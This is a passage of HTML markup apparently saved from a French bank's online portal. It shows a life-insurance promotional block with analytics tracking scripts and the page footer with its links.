<div idcomp="tcm-979-440521"><script> prefixe = 'pack_1111'; </script><div class="bloc-pap" id="racineGDC" version="tcm:979-184523-32 v.3"><script xml:space="preserve">var marqueurXiti="PDC_VF_assurance_vie_062016";var marqueurXiti440521 = marqueurXiti+ '_Affichage'; </script><h2><titre>Assurance Vie</titre></h2><p><style xml:space="preserve">.bloc-pap img{display:block;}</style><dynamiclink animcom="Stevcom" profil_bam="+profil_evt_promo" label="En savoir plus" onclick="clicXiti('PDC_VF_assurance_vie_062016__Module_Libre_Assurance_vie', 'N');" onmouseout="top.window.status='';return true;" onmouseover="top.window.status='En savoir plus';return true;" ref="tcm-979-440541"><a href="https://www.cf-g3-enligne.credit-agricole.fr/stb/entreeBam#" onClick="clicXiti('PDC_VF_assurance_vie_062016__Module_Libre_Assurance_vie', 'N'); javascript:lancerSTEvCom('Stevcom','profil_bam='+profil_evt_promo, this,'ACTION=lancerPUContenu(\'tcm-979-440541\',\'global\')');" onMouseOut="top.window.status='';return true;" onMouseOver="top.window.status='En savoir plus';return true;" shape="rect"><binarycontent img="/pap3_tcm_979_440523.jpg"><script xml:space="preserve">displayBinary(prefixe, "https://www.cf-g3-enligne.credit-agricole.fr/images/868/pack_1111//pap3_tcm_979_440523.jpg", "", "");</script><img border="0" src=""></binarycontent></a></dynamiclink></p><div class="bloc-pap-texte"><p class="lirelasuite"><dynamiclink animcom="Stevcom" profil_bam="+profil_evt_promo" label="En savoir plus" onclick="clicXiti('PDC_VF_assurance_vie_062016__Module_Libre_Assurance_vie', 'N');" onmouseout="top.window.status='';return true;" onmouseover="top.window.status='En savoir plus';return true;" ref="tcm-979-440541"><a href="https://www.cf-g3-enligne.credit-agricole.fr/stb/entreeBam#" onClick="clicXiti('PDC_VF_assurance_vie_062016__Module_Libre_Assurance_vie', 'N'); javascript:lancerSTEvCom('Stevcom','profil_bam='+profil_evt_promo, this,'ACTION=lancerPUContenu(\'tcm-979-440541\',\'global\')');" onMouseOut="top.window.status='';return true;" onMouseOver="top.window.status='En savoir plus';return true;" shape="rect">En savoir plus</a></dynamiclink></p></div></div></div><!--vide-->
<!-----  FIN zone PROMO  ---->

</div>
</div>
</td></tr>

</tbody></table>





<!-----  FIN zone pu  ---->





</td>



</tr></tbody></table>

<!-----  DEBUT zone footer  ---->



<br>
<table width="100%" border="0" cellspacing="0" cellpadding="0">
	<tbody><tr valign="middle" align="center">
		<td>

			<script>
				<!--
				aide_f0= "Accédez aux Conditions Générales d'utilisation";
			//-->
		</script>
		<a href="#" class="footerlien" onMouseOver="StatusMessage(true, aide_f0);return true" onMouseOut="StatusMessage( false )">Conditions Générales d'utilisation</a>

		<span class="footerseparateur">&nbsp;|&nbsp;</span>

		<script>
			<!--
			aide_f1= "Accédez à l'aide";
			//-->
		</script>
		<a href="#" class="footerlien" onMouseOver="StatusMessage(true, aide_f1);return true" onMouseOut="StatusMessage( false )">Aide</a>

		<span class="footerseparateur">&nbsp;|&nbsp;</span>

		<script>
			<!--
			aide_f2= "Accédez au lexique";
			//-->
		</script>
		<a href="#" class="footerlien" onMouseOver="StatusMessage(true, aide_f2);return true" onMouseOut="StatusMessage( false )">Lexique</a>

		<span class="footerseparateur">&nbsp;|&nbsp;</span>

		<script>
			<!--
			aide_f3= "";
			//-->
		</script>
		<a href="#" class="footerlien" onMouseOver="StatusMessage(true, aide_f3);return true" onMouseOut="StatusMessage( false )">Politique de protection des données</a>

		<span class="footerseparateur">&nbsp;|&nbsp;</span>

		<script>
			<!--
			aide_f4= "";
			//-->
		</script>
		<a href="#" class="footerlien" onMouseOver="StatusMessage(true, aide_f4);return true" onMouseOut="StatusMessage( false )">Nos tarifs</a>

	</td>
</tr>
<tr>
	<td align="center">





		<script language="JavaScript">
			var iDSession = "-7972f3341556fd65e36-5b4a.SAG_V6";
			var codeCR = "868";
		</script>	 
		<table width="100%">
			<tbody><tr>
				<td class="footercopyright" align="center">
					<br>&nbsp;
				</td><td>
			</td></tr>
		</tbody></table>
	</td>

</tr>
</tbody></table>

<!-----  FIN zone footer  ---->



</div></body></html>